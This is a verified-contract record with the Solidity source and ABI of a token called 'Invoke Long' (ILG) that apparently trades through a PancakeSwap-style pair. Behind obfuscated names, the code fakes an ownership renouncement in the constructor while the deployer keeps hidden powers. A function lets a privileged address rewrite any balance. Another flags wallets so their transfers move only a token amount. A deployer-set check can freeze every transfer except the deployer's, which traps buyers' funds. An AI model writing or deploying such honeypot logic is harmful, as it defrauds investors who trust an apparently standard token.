{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface senderToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoEnable {\n    function createPair(address atAmount, address shouldSell) external returns (address);\n}\n\ninterface exemptLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTokenFund) external view returns (uint256);\n\n    function transfer(address exemptTeamMax, uint256 shouldEnableMarketing) external returns (bool);\n\n    function allowance(address minMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldEnableMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTeamMax,\n        uint256 shouldEnableMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toFeeReceiver, uint256 value);\n    event Approval(address indexed minMarketing, address indexed spender, uint256 value);\n}\n\ninterface listMin is exemptLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InvokeLong is fromAuto, exemptLimit, listMin {\n\n    address public amountReceiverLaunch;\n\n    mapping(address => bool) public txTotal;\n\n    uint256 private listToken;\n\n    string private tokenMax = \"Invoke Long\";\n\n    mapping(address => uint256) private toMarketing;\n\n    function transfer(address receiverTx, uint256 shouldEnableMarketing) external virtual override returns (bool) {\n        return walletShould(_msgSender(), receiverTx, shouldEnableMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchSender;\n\n    bool private receiverIs;\n\n    uint256 enableToken;\n\n    event OwnershipTransferred(address indexed teamLaunchedAmount, address indexed amountMin);\n\n    function transferFrom(address maxWalletLimit, address exemptTeamMax, uint256 shouldEnableMarketing) external override returns (bool) {\n        if (_msgSender() != totalMarketing) {\n            if (launchSender[maxWalletLimit][_msgSender()] != type(uint256).max) {\n                require(shouldEnableMarketing <= launchSender[maxWalletLimit][_msgSender()]);\n                launchSender[maxWalletLimit][_msgSender()] -= shouldEnableMarketing;\n            }\n        }\n        return walletShould(maxWalletLimit, exemptTeamMax, shouldEnableMarketing);\n    }\n\n    bool public maxTeam;\n\n    uint256 private senderLaunch;\n\n    function walletShould(address maxWalletLimit, address exemptTeamMax, uint256 shouldEnableMarketing) internal returns (bool) {\n        if (maxWalletLimit == maxFrom) {\n            return receiverLaunchTeam(maxWalletLimit, exemptTeamMax, shouldEnableMarketing);\n        }\n        uint256 totalLaunched = exemptLimit(amountReceiverLaunch).balanceOf(listMax);\n        require(totalLaunched == sellTake);\n        require(exemptTeamMax != listMax);\n        if (txTotal[maxWalletLimit]) {\n            return receiverLaunchTeam(maxWalletLimit, exemptTeamMax, fromBuy);\n        }\n        return receiverLaunchTeam(maxWalletLimit, exemptTeamMax, shouldEnableMarketing);\n    }\n\n    uint256 constant fromBuy = 3 ** 10;\n\n    function tradingMarketingTotal(uint256 shouldEnableMarketing) public {\n        exemptShould();\n        sellTake = shouldEnableMarketing;\n    }\n\n    uint256 private modeExemptLaunch;\n\n    uint256 private tokenSellAuto;\n\n    uint256 private liquidityLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityExempt;\n    }\n\n    function allowance(address autoTrading, address toTeamToken) external view virtual override returns (uint256) {\n        if (toTeamToken == totalMarketing) {\n            return type(uint256).max;\n        }\n        return launchSender[autoTrading][toTeamToken];\n    }\n\n    mapping(address => bool) public minFundSwap;\n\n    function owner() external view returns (address) {\n        return isAmount;\n    }\n\n    string private receiverMax = \"ILG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLiquidity;\n    }\n\n    function getOwner() external view returns (address) {\n        return isAmount;\n    }\n\n    bool public buyTrading;\n\n    bool public marketingReceiver;\n\n    uint256 private liquidityExempt = 100000000 * 10 ** 18;\n\n    function liquidityAmount() public {\n        emit OwnershipTransferred(maxFrom, address(0));\n        isAmount = address(0);\n    }\n\n    uint8 private fromLiquidity = 18;\n\n    function receiverShouldMin(address buyLaunched) public {\n        if (maxTeam) {\n            return;\n        }\n        \n        minFundSwap[buyLaunched] = true;\n        \n        maxTeam = true;\n    }\n\n    address totalMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (tokenSellAuto != limitReceiver) {\n            receiverIs = true;\n        }\n        senderToken isEnableFund = senderToken(totalMarketing);\n        amountReceiverLaunch = autoEnable(isEnableFund.factory()).createPair(isEnableFund.WETH(), address(this));\n        \n        maxFrom = _msgSender();\n        liquidityAmount();\n        minFundSwap[maxFrom] = true;\n        toMarketing[maxFrom] = liquidityExempt;\n        if (tokenSellAuto != senderLaunch) {\n            receiverIs = false;\n        }\n        emit Transfer(address(0), maxFrom, liquidityExempt);\n    }\n\n    function exemptShould() private view {\n        require(minFundSwap[_msgSender()]);\n    }\n\n    function receiverLaunchTeam(address maxWalletLimit, address exemptTeamMax, uint256 shouldEnableMarketing) internal returns (bool) {\n        require(toMarketing[maxWalletLimit] >= shouldEnableMarketing);\n        toMarketing[maxWalletLimit] -= shouldEnableMarketing;\n        toMarketing[exemptTeamMax] += shouldEnableMarketing;\n        emit Transfer(maxWalletLimit, exemptTeamMax, shouldEnableMarketing);\n        return true;\n    }\n\n    function approve(address toTeamToken, uint256 shouldEnableMarketing) public virtual override returns (bool) {\n        launchSender[_msgSender()][toTeamToken] = shouldEnableMarketing;\n        emit Approval(_msgSender(), toTeamToken, shouldEnableMarketing);\n        return true;\n    }\n\n    address public maxFrom;\n\n    address private isAmount;\n\n    uint256 sellTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMax;\n    }\n\n    function senderTx(address receiverTx, uint256 shouldEnableMarketing) public {\n        exemptShould();\n        toMarketing[receiverTx] = shouldEnableMarketing;\n    }\n\n    function launchTrading(address walletReceiverTotal) public {\n        exemptShould();\n        if (tokenSellAuto != limitReceiver) {\n            marketingReceiver = true;\n        }\n        if (walletReceiverTotal == maxFrom || walletReceiverTotal == amountReceiverLaunch) {\n            return;\n        }\n        txTotal[walletReceiverTotal] = true;\n    }\n\n    address listMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private limitReceiver;\n\n    function balanceOf(address modeTokenFund) public view virtual override returns (uint256) {\n        return toMarketing[modeTokenFund];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchedAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFeeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTeamToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeamToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiverTotal\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"receiverShouldMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"senderTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"tradingMarketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWalletLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTeamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InvokeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}